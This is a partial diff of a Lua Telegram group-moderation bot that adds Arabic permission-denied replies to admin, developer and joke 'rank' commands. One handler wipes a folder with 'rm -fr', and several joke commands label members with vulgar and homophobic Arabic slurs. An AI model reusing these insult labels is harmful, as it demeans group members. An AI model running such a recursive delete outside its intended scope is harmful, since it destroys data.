-if text == "مسح الملفات" and DevSoFi(msg) then
+if text == "مسح الملفات" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 os.execute("rm -fr File_Bot/*")
 send(msg.chat_id_,msg.id_," ☉┇ تم مسح ملفات البوت يمكنك تحميلها من `المتجر`")
 return false
 end
-if text == ("رفع مطور ثالث") or text == ("رفع مطور") and msg.reply_to_message_id_ and DevSoFi(msg) then
+if text == ("رفع مطور ثالث") or text == ("رفع مطور") and msg.reply_to_message_id_ then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -5941,7 +6353,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == ("تنزيل مطور") or text == ("تنزيل مطور ثالث") and msg.reply_to_message_id_ and DevSoFi(msg) then
+if text == ("تنزيل مطور") or text == ("تنزيل مطور ثالث") and msg.reply_to_message_id_ then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6011,7 +6427,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == ("رفع ادمن عام") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("رفع ادمن عام") and msg.reply_to_message_id_ then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -6085,7 +6505,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == ("تنزيل ادمن عام") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("تنزيل ادمن عام") and msg.reply_to_message_id_ then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6158,7 +6582,11 @@ end
 
 
 
-if text == ("رفع مدير عام") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("رفع مدير عام") and msg.reply_to_message_id_ then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -6232,7 +6660,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == ("تنزيل مدير عام") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("تنزيل مدير عام") and msg.reply_to_message_id_ then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6305,13 +6737,21 @@ end
 
 
 
-if text == ("مسح قائمه المالك") and Sudo(msg) then
+if text == ("مسح قائمه المالك") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'CoSu'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح قائمه المالك')
 return false
 end
 
-if text == 'قائمه المالك' and Sudo(msg) then
+if text == 'قائمه المالك' then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
 t = "\n ☉┇ قائمه المالك \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -6345,7 +6785,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("رفع مالك") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("رفع مالك") and msg.reply_to_message_id_ then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6419,7 +6863,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("تنزيل مالك") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("تنزيل مالك") and msg.reply_to_message_id_ then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7164,7 +7612,11 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------ adddev2 sudog
-if text == ("رفع مطور ثاني") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
+if text == ("رفع مطور ثاني") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 function Function_DRAGON(extra, result, success)
 database:sadd(bot_id.."Dev:SoFi:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","☉┇ تم ترقيته مطور ثاني في البوت")  
@@ -7195,7 +7647,11 @@ database:sadd(bot_id.."Dev:SoFi:2", userid)
 Reply_Status(msg,userid,"reply","☉┇ تم ترقيته مطور ثاني في البوت")  
 return false 
 end
-if text == ("تنزيل مطور ثاني") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
+if text == ("تنزيل مطور ثاني") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 function Function_DRAGON(extra, result, success)
 database:srem(bot_id.."Dev:SoFi:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","☉┇ تم تنزيله من المطور ثانيين")  
@@ -7222,7 +7678,11 @@ database:srem(bot_id.."Dev:SoFi:2", userid)
 Reply_Status(msg,userid,"reply","☉┇ تم تنزيله من المطور ثانيين")  
 return false 
 end
-if text == ("المطورين الثانين") and SudoBot(msg) then
+if text == ("المطورين الثانين") then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id.."Dev:SoFi:2")
 t = "\n☉┇ قائمة مطورين الثانين للبوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7242,7 +7702,11 @@ if text == ("مسح المطورين الثانين") and SudoBot(msg) then
 database:del(bot_id.."Dev:SoFi:2")
 send(msg.chat_id_, msg.id_, "\n☉┇ تم مسح قائمة المطورين الثانين  ")
 end
-if text == ("الادمنيه العامين") and SudoBot(msg) then
+if text == ("الادمنيه العامين") then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id.."Gmod:User")
 t = "\n☉┇ قائمة الادمنيه في البوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7258,11 +7722,19 @@ t = "☉┇ لا يوجد ادمنيه عامين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("مسح الادمنيه العامين") and SudoBot(msg) then
+if text == ("مسح الادمنيه العامين") then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id.."Gmod:User")
 send(msg.chat_id_, msg.id_, "\n☉┇ تم مسح قائمة الادمنيه العامين  ")
 end
-if text == ("المدراء العامين") and SudoBot(msg) then
+if text == ("المدراء العامين") then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id.."Gmanager")
 t = "\n☉┇ قائمة المدراء في البوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7278,12 +7750,20 @@ t = "☉┇ لا يوجد مدراء عامين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("مسح المدراء العامين") and SudoBot(msg) then
+if text == ("مسح المدراء العامين") then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id.."Gmanager")
 send(msg.chat_id_, msg.id_, "\n☉┇ تم مسح قائمة المدراء العامين  ")
 end
 ------------------------------------------------------------------------
-if text ==("رفع الادمنيه") and Manager2(msg) then
+if text ==("رفع الادمنيه") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 local num2 = 0
 local admins = data.members_
@@ -7313,7 +7793,11 @@ if text == 'مسح الادمنيه' and Manager(msg) then
 database:del(bot_id..'Mod:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح الادمنيه')
 end
-if text == ("الادمنيه") and Manager2(msg) then
+if text == ("الادمنيه") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الادمنيه \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7678,7 +8162,11 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
-if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
+if text == ("طرد") and msg.reply_to_message_id_ ~=0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7821,11 +8309,19 @@ return false
 end
 ------------------------------------------------------------------------
 ------------------------------------------------------------------------
-if text == 'مسح المميزين' and Mod(msg) then
+if text == 'مسح المميزين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Special:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح المميزين')
 end
-if text == ("المميزين") and Mod(msg) then
+if text == ("المميزين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة مميزين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -7857,7 +8353,11 @@ t = " ☉┇ لا يوجد مميزين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -7945,7 +8445,11 @@ end;end,nil)
 return false
 end
 
-if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8016,11 +8520,19 @@ end;end,nil)
 return false
 end  
 ------------------------------------------------------------------------
-if text == 'تنزيل المطايه' and Mod(msg) then
+if text == 'تنزيل المطايه' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Mote:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح جميع المطايه')
 end
-if text == ("تاك للمطايه") and Mod(msg) then
+if text == ("تاك للمطايه") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة مطايه الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8037,7 +8549,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8063,7 +8579,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8085,11 +8605,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح المتزوجين' and Mod(msg) then
+if text == 'مسح المتزوجين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Mode:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح جميع المتزوجين')
 end
-if text == ("تاك للمتزوجين") and Mod(msg) then
+if text == ("تاك للمتزوجين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه ازواج الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8106,7 +8634,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8132,7 +8664,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("طلاق")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("طلاق")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8154,11 +8690,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح الخولات' and Mod(msg) then
+if text == 'مسح الخولات' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Modde:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الخولات')
 end
-if text == ("تاك للخولات") and Mod(msg) then
+if text == ("تاك للخولات") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه خولات الجروب \nٴ•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n"
 for k,v in pairs(list) do
@@ -8175,7 +8719,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8201,7 +8749,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل خول")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل خول")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8223,11 +8775,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'تنزيل الصخوله' and Mod(msg) then
+if text == 'تنزيل الصخوله' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Sakl:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع صخوله من الجروب')
 end
-if text == ("تاك للصخوله") and Mod(msg) then
+if text == ("تاك للصخوله") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة صخوله الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8244,7 +8804,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8271,7 +8835,11 @@ return false
 end
 
 
-if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8293,11 +8861,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح الكلاب' and Mod(msg) then
+if text == 'مسح الكلاب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Motte:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسج كل كلاب الجروب')
 end
-if text == ("تاك للكلاب") and Mod(msg) then
+if text == ("تاك للكلاب") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة كلاب الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8314,7 +8890,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8340,7 +8920,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8362,11 +8946,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'تنزيل القروده' and Mod(msg) then
+if text == 'تنزيل القروده' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Motee:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع القروده بالجروب')
 end
-if text == ("تاك للقروده") and Mod(msg) then
+if text == ("تاك للقروده") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة القروده الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8383,7 +8975,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8409,7 +9005,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8431,11 +9031,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'تنزيل الضلوع' and Mod(msg) then
+if text == 'تنزيل الضلوع' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Bro:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع الضلوع بالجروب')
 end
-if text == ("تاك للضلوع") and Mod(msg) then
+if text == ("تاك للضلوع") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الضلوع الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8452,7 +9060,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع ضلع") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع ضلع") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8478,7 +9090,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل ضلع")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل ضلع")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8500,11 +9116,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح النسوان' and Mod(msg) then
+if text == 'مسح النسوان' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Girl:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل النسوان بالجروب')
 end
-if text == ("تاك للنسوان") and Mod(msg) then
+if text == ("تاك للنسوان") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة نسوان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8521,7 +9145,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8547,7 +9175,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل مره")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل مره")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8569,11 +9201,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح المتناكين' and Mod(msg) then
+if text == 'مسح المتناكين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Nek:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل متناكين الجروب')
 end
-if text == ("تاك للمتناكين") and Mod(msg) then
+if text == ("تاك للمتناكين") then
+if not Mod(msg) then
